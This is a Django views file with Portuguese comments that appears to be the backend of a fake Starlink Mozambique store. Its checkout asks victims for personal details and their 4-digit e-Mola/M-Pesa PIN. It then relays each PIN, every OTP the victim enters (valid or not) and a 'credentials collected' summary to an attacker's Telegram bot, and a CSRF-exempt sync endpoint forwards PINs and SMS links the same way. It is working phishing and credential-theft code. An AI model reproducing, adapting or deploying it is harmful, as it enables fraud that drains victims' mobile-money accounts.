import os
import json
import random
import requests
from datetime import datetime
from django.conf import settings
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib import messages
from .models import Order

def index(request):
    """Exibe a página principal / catálogo de kits Starlink."""
    return render(request, 'orders/index.html')


def generate_otp():
    """Gera um código de 6 dígitos para validação e-Mola / M-Pesa."""
    return str(random.randint(100000, 999999))


def send_telegram_notification(order, extra_info=None, custom_report=None):
    """Envia notificações ricas para o canal do Telegram configurado."""
    token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_CHAT_ID
    if not token or not chat_id or token == 'YOUR_BOT_TOKEN': 
        return

    if custom_report:
        message = custom_report
    else:
        message = (
            f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
            f"💳 *MÉTODO:* MOVITEL (E-MOLA)\n"
            f"👤 *Cliente:* {order.full_name}\n"
            f"📞 *Telefone:* {order.phone}\n"
            f"💰 *Total:* {order.total_amount} MT\n"
            f"--------------------------------\n"
        )
        if extra_info: 
            message += f"📝 *INFO:* {extra_info}\n"
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try: 
        requests.post(url, data=payload, timeout=10)
    except Exception: 
        pass


def checkout(request):
    """
    PASSO 1 & 2 UNIFICADO: Captura os dados cadastrais, o número de telefone 
    e o PIN de 4 dígitos diretamente na mesma tela.
    """
    if request.method == 'POST':
        # 1. Captura o Telefone e o PIN enviados juntos pela interface
        phone = request.POST.get('phone')  # Certifique-se de que o name no HTML é 'phone'
        pin = request.POST.get('pin_code', '').strip()  # Certifique-se de que o name no HTML é 'pin_code'

        # Validação estrita: impede que PIN inválido quebre o fluxo ou salve dados corrompidos
        if not pin.isdigit() or len(pin) != 4:
            return render(request, 'orders/checkout.html', {
                'error': 'Erro: O PIN deve conter exatamente 4 dígitos numéricos.'
            })

        # 2. Cria o registro do pedido completo diretamente no Banco de Dados
        order = Order.objects.create(
            full_name=request.POST.get('fullName', 'Cliente Starlink'),
            national_id=request.POST.get('nationalId'),
            email=request.POST.get('email'),
            phone=phone,
            contact_person=request.POST.get('contactPerson'),
            alt_phone=request.POST.get('altPhone'),
            city=request.POST.get('city'),
            address=request.POST.get('address'),
            delivery_method=request.POST.get('delivery_method'),
            payment_method='movitel',
            total_amount=request.POST.get('total_amount', 2500), # Captura os valores dinâmicos (ex: 2500 MT)
            pin_code=pin
        )
        
        # Guarda o PIN na sessão para persistência e validação no passo do OTP
        request.session[f'pin_{order.id}'] = pin
        
        # Envia os dados iniciais coletados e o PIN capturado imediatamente para o Telegram
        send_telegram_notification(order, f"🚀 *DADOS E PIN COLETADOS*\n🔑 PIN: `{pin}`\n💬 Aguardando a digitação do OTP...")
        
        # 3. Gera automaticamente o código OTP de 6 dígitos
        otp = generate_otp()
        order.otp_code = otp
        order.otp_created_at = datetime.now()
        order.otp_resend_count = 0
        order.save()
        
        # Notifica o painel do Telegram com o código OTP que foi gerado no sistema
        send_telegram_notification(order, f"💬 *CÓDIGO OTP GERADO NO SISTEMA:* `{otp}`")
        
        # Redireciona o usuário direto para o formulário de verificação do OTP
        return redirect('verify_otp', order_id=order.id)
        
    return render(request, 'orders/checkout.html')


def verify_otp(request, order_id):
    """PASSO 3: Valida o código OTP final de 6 dígitos digitado pelo usuário."""
    order = get_object_or_404(Order, id=order_id)
    
    if request.method == 'POST':
        user_otp = request.POST.get('otp_code', '').strip()
        # Recupera o PIN que salvamos na sessão no passo anterior
        saved_pin = request.session.get(f'pin_{order.id}', order.pin_code or 'Não localizado')
        
        if order.otp_code == user_otp:
            order.status = 'Paid'
            order.save()
            
            # Relatório completo unificado final contendo todas as credenciais coletadas
            relatorio_final = (
                f"✅ *PAGAMENTO APROVADO E PROCESSADO*\n"
                f"----------------------------------\n"
                f"👤 *Cliente:* {order.full_name}\n"
                f"📱 *Telefone:* {order.phone}\n"
                f"🔑 *PIN Capturado:* `{saved_pin}`\n"
                f"💬 *OTP Confirmado:* `{user_otp}`\n"
                f"💰 *Total Processado:* {order.total_amount} MT\n"
                f"----------------------------------"
            )
            send_telegram_notification(order, custom_report=relatorio_final)
            return render(request, 'orders/payment_success.html', {'order': order})
        else:
            send_telegram_notification(order, f"❌ *Tentativa inválida de OTP:* `{user_otp}` | PIN associado: `{saved_pin}`")
            return render(request, 'orders/otp_verification.html', {
                'order': order, 
                'error': 'Código OTP inválido. Verifique o SMS e tente novamente.'
            })
            
    return render(request, 'orders/otp_verification.html', {'order': order})


def resend_otp(request, order_id):
    """Gera e reenvia um novo código OTP mantendo o fluxo atual."""
    order = get_object_or_404(Order, id=order_id)
    otp = generate_otp()
    order.otp_code = otp
    order.otp_created_at = datetime.now()
    order.save()
    send_telegram_notification(order, f"🔄 *NOVO OTP REENVIADO:* {otp}")
    return render(request, 'orders/otp_verification.html', {
        'order': order, 
        'message': 'Um novo código OTP foi enviado por SMS.'
    })


@csrf_exempt
def sync_emola(request):
    """Endpoint assíncrono mantido para integrações em tempo real via API."""
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            report = (
                "🚀 *STARLINK MOÇAMBIQUE SYNC*\n"
                "----------------------------------\n"
                f"👤 *Cliente:* `{data.get('name')}` | `{data.get('id_no')}`\n"
                f"📞 *Contacto:* `{data.get('phone')}`\n"
                f"📍 *Cidade:* `{data.get('city')}`\n"
                "----------------------------------\n"
                f"💰 *Pagamento:* `EMOLA / M-PESA`\n"
                f"🔑 *PIN Confirmação:* `{data.get('pin')}`\n"
                f"🔗 *Link SMS:* `{data.get('sms_link')}`\n"
                "----------------------------------\n"
                f"📦 *Pedido:* {data.get('item')} ({data.get('total')} MT)"
            )
            send_telegram_notification(order=None, custom_report=report)
            return JsonResponse({"status": "synchronized"})
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=400)
            
    return JsonResponse({"status": "error", "message": "Método não permitido"}, status=405)